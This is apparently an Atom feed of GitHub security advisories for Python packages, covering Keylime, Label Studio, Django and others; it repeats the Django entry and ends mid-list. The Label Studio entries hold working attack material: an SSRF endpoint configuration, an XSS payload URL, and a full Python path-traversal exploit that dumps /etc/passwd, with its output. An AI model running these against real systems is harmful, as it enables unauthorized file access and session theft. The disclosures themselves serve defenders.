<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-02-15T19:01:14.977Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[keylime] Keylime registrar is vulnerable to Denial-of-Service attack when updated to version 7.12.0]]></title>
        <id>https://github.com/advisories/GHSA-9jxq-5x44-gx23</id>
        <link href="https://github.com/advisories/GHSA-9jxq-5x44-gx23"/>
        <updated>2025-02-14T18:03:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Keylime <code>registrar</code> implemented more strict type checking on version 7.12.0. As a result, when updated to version 7.12.0, the <code>registrar</code> will not accept the format of the data previously stored in the database by versions  &gt;= 7.8.0, raising an exception.</p>
<p>This makes the Keylime <code>registrar</code> vulnerable to a Denial-of-Service attack in an update scenario, as an attacker could populate the <code>registrar</code> database by creating multiple valid agent registrations with different UUIDs while the version is still &lt; 7.12.0. Then, when the Keylime <code>registrar</code> is updated to the 7.12.0 version, any query to the database matching any of the entries populated by the attacker will result in failure.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to versions &gt;= 7.12.1</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Remove the registrar database and re-register all agents</li>
</ul>
<h3 id="credit">Credit</h3>
<p>Reported by: Anderson Toshiyuki Sasaki/@ansasaki
Patched by: Anderson Toshiyuki Sasaki/@ansasaki</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23">https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23</a></li>
<li><a href="https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7">https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7</a></li>
<li><a href="https://github.com/advisories/GHSA-9jxq-5x44-gx23">https://github.com/advisories/GHSA-9jxq-5x44-gx23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jxq-5x44-gx23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T18:03:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio allows Server-Side Request Forgery in the S3 Storage Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-m238-fmcw-wh58</id>
        <link href="https://github.com/advisories/GHSA-m238-fmcw-wh58"/>
        <updated>2025-02-14T22:18:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Label Studio's S3 storage integration feature contains a Server-Side Request Forgery (SSRF) vulnerability in its endpoint configuration. When creating an S3 storage connection, the application allows users to specify a custom S3 endpoint URL via the s3_endpoint parameter. This endpoint URL is passed directly to the boto3 AWS SDK without proper validation or restrictions on the protocol or destination.</p>
<p>The vulnerability allows an attacker to make the application send HTTP requests to arbitrary internal services by specifying them as the S3 endpoint. When the storage sync operation is triggered, the application attempts to make S3 API calls to the specified endpoint, effectively making HTTP requests to the target service and returning the response in error messages.</p>
<p>This SSRF vulnerability enables attackers to bypass network segmentation and access internal services that should not be accessible from the external network. The vulnerability is particularly severe because error messages from failed requests contain the full response body, allowing data exfiltration from internal services.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ol>
<li><p>Create an account in Label Studio</p>
</li>
<li><p>Create a new project with basic configuration</p>
</li>
<li><p>Create an S3 storage connection with the following configuration:</p>
<pre><code class="language-json">{
  "project": 1,
  "title": "Test Storage",
  "bucket": "&lt;filename&gt;",
  "s3_endpoint": "http://internal-web",
  "use_blob_urls": true,
  "aws_access_key_id": "test",
  "aws_secret_access_key": "test"
}
</code></pre>
</li>
<li><p>Trigger a storage sync operation by sending a POST request to <code>/api/storages/s3/[storage_id]/sync</code></p>
</li>
</ol>
<p>The application will attempt to connect to the specified endpoint URL as if it were an S3 service. When the request fails due to invalid S3 API responses, the error message will contain the raw response from the internal service, allowing access to internal resources.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Implement strict validation of S3 endpoint URLs to allow only valid S3service endpoints</li>
<li>Add an allowlist of endpoint domains and protocols</li>
<li>Sanitize error messages to prevent leakage of sensitive information from failed requests</li>
<li>Consider implementing network-level controls to restrict outbound connections from the application server</li>
</ul>
<h2 id="impact">Impact</h2>
<p>This vulnerability has high severity as it allows authenticated users to make requests to arbitrary internal services from the application server, potentially exposing sensitive internal resources and bypassing network segmentation. The inclusion of response data in error messages makes this particularly effective for data exfiltration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79">https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25297">https://nvd.nist.gov/vuln/detail/CVE-2025-25297</a></li>
<li><a href="https://github.com/advisories/GHSA-m238-fmcw-wh58">https://github.com/advisories/GHSA-m238-fmcw-wh58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m238-fmcw-wh58</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-14T15:26:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio allows Cross-Site Scripting (XSS) via GET request to `/projects/upload-example` endpoint]]></title>
        <id>https://github.com/advisories/GHSA-wpq5-3366-mqw4</id>
        <link href="https://github.com/advisories/GHSA-wpq5-3366-mqw4"/>
        <updated>2025-02-14T22:18:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Label Studio's <code>/projects/upload-example</code> endpoint allows injection of arbitrary HTML through a <code>GET</code> request with an appropriately crafted <code>label_config</code> query parameter. By crafting a specially formatted XML label config with inline task data containing malicious HTML/JavaScript, an attacker can achieve Cross-Site Scripting (XSS). While the application has a Content Security Policy (CSP), it is only set in report-only mode, making it ineffective at preventing script execution.</p>
<p>The vulnerability exists because the upload-example endpoint renders user-provided HTML content without proper sanitization on a GET request. This allows attackers to inject and execute arbitrary JavaScript in victims' browsers by getting them to visit a maliciously crafted URL.</p>
<p>This is considered vulnerable because it enables attackers to execute JavaScript in victims' contexts, potentially allowing theft of sensitive data, session hijacking, or other malicious actions.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ol>
<li>Create a malicious label config that includes an XSS payload in embedded task data:</li>
</ol>
<pre><code class="language-xml">&lt;View&gt;&lt;!-- {"data": {"text": "&lt;div&gt;&lt;img src=x
onerror=eval(atob(`YWxlcnQoIlhTUyIp`))&gt;&lt;/div&gt;"}} --&gt;&lt;HyperText name="text"
value="$text"/&gt;&lt;/View&gt;
</code></pre>
<ol start="2">
<li>URL encode the payload and access the following URL:</li>
</ol>
<ul>
<li><a href="http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22:%20%7B%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(%60YWxlcnQoIlhTUyIp%60))%3E%3C/div%3E%22%7D%7D%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E">http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20{%22data%22:%20{%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(`YWxlcnQoIlhTUyIp`))%3E%3C/div%3E%22}}%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E</a></li>
</ul>
<p>When executed, the payload causes the application to render an HTML page containing an img tag that fails to load, triggering the onerror event handler which executes base64-decoded JavaScript, demonstrating successful XSS execution in the victim's browser.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Enable the Content Security Policy in enforcement mode instead of report-only mode to actively block unauthorized script execution</li>
<li>Deprecate the <code>GET</code> behavior at the <code>example-config</code> endpoint since it's not used</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability requires no special privileges and can be exploited by getting a victim to visit a crafted URL. The impact is high as it allows arbitrary JavaScript execution in victims' browsers, potentially exposing sensitive data or enabling account takeover through session theft.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885">https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25296">https://nvd.nist.gov/vuln/detail/CVE-2025-25296</a></li>
<li><a href="https://github.com/advisories/GHSA-wpq5-3366-mqw4">https://github.com/advisories/GHSA-wpq5-3366-mqw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpq5-3366-mqw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T15:23:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio-sdk] Label Studio has a Path Traversal Vulnerability via image Field]]></title>
        <id>https://github.com/advisories/GHSA-rgv9-w7jp-m23g</id>
        <link href="https://github.com/advisories/GHSA-rgv9-w7jp-m23g"/>
        <updated>2025-02-14T18:40:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>A path traversal vulnerability in Label Studio SDK versions prior to 1.0.10 allows unauthorized file access outside the intended directory structure. Label Studio versions before 1.16.0 specified SDK versions prior to 1.0.10 as dependencies, and the issue was confirmed in Label Studio version 1.13.2.dev0; therefore, Label Studio users should upgrade to 1.16.0 or newer to mitigate it. The flaw exists in the VOC, COCO and YOLO export functionalites. These functions invoke a <code>download</code> function on the <code>label-studio-sdk</code> python package, which fails to validate file paths when processing image references during task exports:</p>
<pre><code class="language-python">def download(
    url,
    output_dir,
    filename=None,
    project_dir=None,
    return_relative_path=False,
    upload_dir=None,
    download_resources=True,
):
    is_local_file = url.startswith("/data/") and "?d=" in url
    is_uploaded_file = url.startswith("/data/upload")

    if is_uploaded_file:
        upload_dir = _get_upload_dir(project_dir, upload_dir)
        filename = urllib.parse.unquote(url.replace("/data/upload/", ""))
        filepath = os.path.join(upload_dir, filename)
        logger.debug(
            f"Copy {filepath} to {output_dir}".format(
                filepath=filepath, output_dir=output_dir
            )
        )
        if download_resources:
            shutil.copy(filepath, output_dir)
        if return_relative_path:
            return os.path.join(
                os.path.basename(output_dir), os.path.basename(filename)
            )
        return filepath

    if is_local_file:
        filename, dir_path = url.split("/data/", 1)[-1].split("?d=")
        dir_path = str(urllib.parse.unquote(dir_path))
        filepath = os.path.join(LOCAL_FILES_DOCUMENT_ROOT, dir_path)
        if not os.path.exists(filepath):
            raise FileNotFoundError(filepath)
        if download_resources:
            shutil.copy(filepath, output_dir)
        return filepath
</code></pre>
<p>By creating tasks with path traversal sequences in the image field, an attacker can force the application to read files from arbitrary server filesystem locations when exporting projects in any of the mentioned formats.</p>
<p>Note that there are two different possible code paths leading to this result, one for the <code>is_uploaded_file</code> and another one for the <code>is_local_file</code>.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Login to Label Studio</p>
</li>
<li><p>Create project with image labeling configuration</p>
</li>
<li><p>If the <code>data/media/upload</code> directory doesn't exists yet, upload an image to force the server to create it</p>
</li>
<li><p>Create task with path traversal in image field</p>
<p> 4.1. To trigger the <code>is_uploaded_file</code> code path:</p>
<pre><code class="language-json">{
  "data": {
    "text": "test",
    "image": "/data/upload/../../../../../etc/passwd"
  }
}
</code></pre>
<p> 4.2. To trigger the <code>is_local_file</code> code path:</p>
<pre><code class="language-json">{
  "data": {
    "text": "test",
    "image": "/data/local-files/?d=../../../etc/passwd"
  }
}
</code></pre>
</li>
<li><p>Export project using VOC, YOLO or COCO formats. The server will return a Zip file in any of the three cases, for example:</p>
<pre><code>GET /api/projects/1/export?exportType=VOC&amp;download_all_tasks=true&amp;download_resources=true
</code></pre>
</li>
<li><p>Download the generated Zip file. The server's /etc/passwd file will be at <code>images/passwd</code> on the Zip file.</p>
</li>
</ol>
<p>Alternatively, use the following exploit code, updating the <code>BASE_URL</code>, <code>USERNAME</code> and <code>PASSWORD</code> variables. Please note that the code will attempt to create a new user, but if the user exists and the credentials are valid, it will still work. Modify <code>METHOD</code> and <code>EXPORT_TYPE</code> to test the different code paths and export formats:</p>
<pre><code class="language-python">import requests
from bs4 import BeautifulSoup
import io
import zipfile


BASE_URL = "http://xbow-app-1:8000"
USERNAME = "test@test.com"
PASSWORD = "Test123!@#"
METHOD = "is_uploaded_file" # Valid values: "is_uploaded_file" or "is_local_file"
EXPORT_TYPE = "VOC"         # Valid values: "VOC", "COCO" or "YOLO"

print("Signing up...")
url = "%s/user/signup/" % BASE_URL
session = requests.Session()

# First get the CSRF token
response = session.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
print(f"Got CSRF token: {csrf_token}")

# Prepare registration data
data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
    'allow_newsletters': 'false',
    'allow_newsletters_visual': 'false'
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Submit the registration request
response = session.post(url, data=data, headers=headers)
print(f"User registration response status code: {response.status_code}\n")

# Login
print("Logging in...")
url = "%s/user/login" % BASE_URL

# Attempt login with our credentials
login_data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

response = session.post(url, data=login_data, headers=headers)

print(f"Login response status code: {response.status_code}")

# Check if we got any tokens in the response
print("\nCookies after login:")
for cookie in session.cookies:
    print(f"{cookie.name}: {cookie.value}")


# We will use these headers moving forward
headers = {
    'Content-Type': 'application/json',
    'X-CSRFToken': session.cookies['csrftoken']
}

# Creat a project to then create a task associated to it
print("\nCreating project...")
# Try to create a project with a file upload configuration
project_data = {
    "title": "File Upload Test",
    "description": "Testing file upload functionality",
    "label_config": """
    &lt;View&gt;
      &lt;Image name="image" value="$image"/&gt;
      &lt;Text name="text" value="$text"/&gt;
      &lt;Choices name="choice" toName="image"&gt;
        &lt;Choice value="yes"/&gt;
        &lt;Choice value="no"/&gt;
      &lt;/Choices&gt;
    &lt;/View&gt;
    """
}
response = session.post("%s/api/projects/" % BASE_URL, json=project_data, headers=headers)
if response.status_code != 201:
    print("Problem creating project, aborting")
    exit(0)    
project_id = response.json()['id']
print(f"Project ID: {project_id}\n")

# Create task using a filename to later abuse a path traversal vulnerability during file export
print(f"Creating task with method {METHOD} (defaults to is_local_file)...")
task_data = {}
if (METHOD == "is_uploaded_file"):
    task_data["data"] = {
            "text": "test",
            "image": "/data/upload/../../../../../etc/passwd"    # Trigger for is_uploaded_file
    }
else:
    task_data["data"] = {
            "text": "test",
            "image": "/data/local-files/?d=../../../etc/passwd" # Trigger for is_local_file
    }
response = session.post(f"{BASE_URL}/api/projects/{project_id}/tasks", json=task_data, headers=headers)
if response.status_code != 201:
    print("Problem creating task, aborting")
    exit(0)    
task_id = response.json()['id']
print(f"Task created successfully, task id: {task_id}\n")

# Issue a dummy upload request to force the creation of the ~/data/images/upload folder
response = session.post(f"{BASE_URL}/api/projects/{project_id}/import?commit_to_project=false", files={"bar.png":"data"})

# Request the server to generate a zip with all of the project information and files (works for YOLO, COCO or VOC)
response = session.get(f"{BASE_URL}/api/projects/{project_id}/export?exportType={EXPORT_TYPE}&amp;download_all_tasks=true&amp;download_resources=true")
if (response.status_code != 200):
    print("Couldn't fetch export file")
    exit(0)

file_like_object = io.BytesIO(response.content)
zipfile_ob = zipfile.ZipFile(file_like_object)
print("Dumping /etc/passwd file contents:")
print(zipfile_ob.read("images/passwd").decode("utf-8"))
</code></pre>
<p>Output:</p>
<pre><code>$ python3 studio-min.py
Signing up...
Got CSRF token: CQXYq1qbQ5jMG2FjQfzodC3i6weiIMq9T6lqhBQLT94sbcLKOg0ZeZxep7hPKLM6
User registration response status code: 200

Logging in...
Login response status code: 200

Cookies after login:
csrftoken: PsEKLHstcGIXDFCP3OGQGCwKUFOdlN33
sessionid: .eJxVj8tyhSAQRP-FtVrIQ8Dl3ecbqAEGNRqwRKvyqPx7JHUXyXKme7rnfJFrCWQkTDHlpYit1jq2AiVrgQpoqZYATvSMu540JB8TpOUTziUnu69k7BuyQTntlqcl3aPiSklquOoUZ7pnoiEWrnO2V8HD_lbVnD87B37FVIXwCmnKnc_pPBbXVUv3VEv3kgNuj6f3X8AMZb6vTaQQuaaoghCOBqFMuJ8egjdGGu4oiMCDdkpHGEQMWhoXNUM59D5Q5-_QFXG3b1hhJgy2AkXYCt51BUupzPi-L8cHGen3D57HZCg:1tbQOv:nomwczhhTvAaXMoyRrO30lWR5UkGi7AqiUHKyshQJ30

Creating project...
Project ID: 10

Creating task with method is_uploaded_file (defaults to is_local_file)...
Task created successfully, task id: 10

Dumping /etc/passwd file contents:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
nginx:x:999:999:nginx user:/nonexistent:/usr/sbin/nologin
</code></pre>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Validate and sanitize file paths</li>
<li>Add an allowlist of directories and file types</li>
<li>Implement file access controls</li>
<li>Use randomized file names and secure file storage abstraction</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Authentication-required vulnerability allowing arbitrary file reads from the server filesystem. Potential exposure of sensitive information like configuration files, credentials, and confidential data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g</a></li>
<li><a href="https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df">https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25295">https://nvd.nist.gov/vuln/detail/CVE-2025-25295</a></li>
<li><a href="https://github.com/advisories/GHSA-rgv9-w7jp-m23g">https://github.com/advisories/GHSA-rgv9-w7jp-m23g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgv9-w7jp-m23g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-14T15:16:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-submarine] Apache Submarine Server Core Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6q97-8v3g-rpxw</id>
        <link href="https://github.com/advisories/GHSA-6q97-8v3g-rpxw"/>
        <updated>2025-02-13T18:41:55.000Z</updated>
        <content type="html"><![CDATA[<p>Incorrect Authorization vulnerability in Apache Submarine Server Core.</p>
<p>This issue affects Apache Submarine Server Core: from 0.8.0.</p>
<p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.</p>
<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36265">https://nvd.nist.gov/vuln/detail/CVE-2024-36265</a></li>
<li><a href="https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz">https://lists.apache.org/thread/prckhhst19qxof064hsm8cccxtofvflz</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/06/12/3">http://www.openwall.com/lists/oss-security/2024/06/12/3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2024-98.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6q97-8v3g-rpxw">https://github.com/advisories/GHSA-6q97-8v3g-rpxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q97-8v3g-rpxw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-12T15:31:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastecdsa] Uninitialized Variable in fastecdsa]]></title>
        <id>https://github.com/advisories/GHSA-ph86-g9r3-5qw4</id>
        <link href="https://github.com/advisories/GHSA-ph86-g9r3-5qw4"/>
        <updated>2025-02-12T21:59:32.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package fastecdsa before 2.3.2 use an Uninitialized Variable on the stack, via the curvemath_mul function in src/curveMath.c, due to being used and interpreted as user-defined type. Depending on the variable's actual value it could be arbitrary free(), arbitrary realloc(), null pointer dereference and other. Since the stack can be controlled by the attacker, the vulnerability could be used to corrupt allocator structure, leading to possible heap exploitation. The attacker could cause denial of service by exploiting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21502">https://nvd.nist.gov/vuln/detail/CVE-2024-21502</a></li>
<li><a href="https://github.com/AntonKueltz/fastecdsa/commit/57fc5689c95d649dab7ef60cc99ac64589f01e36">https://github.com/AntonKueltz/fastecdsa/commit/57fc5689c95d649dab7ef60cc99ac64589f01e36</a></li>
<li><a href="https://gist.github.com/keltecc/49da037072276f21b005a8337c15db26">https://gist.github.com/keltecc/49da037072276f21b005a8337c15db26</a></li>
<li><a href="https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c%23L210">https://github.com/AntonKueltz/fastecdsa/blob/v2.3.1/src/curveMath.c%23L210</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-FASTECDSA-6262045">https://security.snyk.io/vuln/SNYK-PYTHON-FASTECDSA-6262045</a></li>
<li><a href="https://github.com/advisories/GHSA-ph86-g9r3-5qw4">https://github.com/advisories/GHSA-ph86-g9r3-5qw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ph86-g9r3-5qw4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-24T06:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ray] Withdrawn Advisory: Command injection in Ray]]></title>
        <id>https://github.com/advisories/GHSA-xg2h-7cxj-3gvh</id>
        <link href="https://github.com/advisories/GHSA-xg2h-7cxj-3gvh"/>
        <updated>2025-02-14T21:30:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="withdrawn-advisory">Withdrawn Advisory</h1>
<p>This advisory is a duplicate of GHSA-6wgj-66m2-xxp2 / CVE-2023-48022.</p>
<h1 id="original-description">Original Description</h1>
<p>An issue in Anyscale Inc Ray between v.2.9.3 and v.2.40.0 allows a remote attacker to execute arbitrary code via a crafted script.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57000">https://nvd.nist.gov/vuln/detail/CVE-2024-57000</a></li>
<li><a href="https://github.com/honysyang/Ray.git">https://github.com/honysyang/Ray.git</a></li>
<li><a href="https://github.com/advisories/GHSA-xg2h-7cxj-3gvh">https://github.com/advisories/GHSA-xg2h-7cxj-3gvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xg2h-7cxj-3gvh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T00:32:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2025-02-12T05:03:58.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/D2JIRXEDP4ZET5KFMAPPYSK663Q52NEX</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SN2PLJGYSAAG5KUVIUFJYKD3BLQ4OSN6</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZQJOMNRMVPCN5WMIZ7YSX5LQ7IR2NY4D</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/03/04/1">http://www.openwall.com/lists/oss-security/2024/03/04/1</a></li>
<li><a href="https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521">https://github.com/django/django/commit/072963e4c4d0b3a7a8c5412bc0c7d27d1a9c3521</a></li>
<li><a href="https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e">https://github.com/django/django/commit/3394fc6132436eca89e997083bae9985fb7e761e</a></li>
<li><a href="https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a">https://github.com/django/django/commit/3c9a2771cc80821e041b16eb36c1c37af5349d4a</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2025-02-12T05:03:58.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
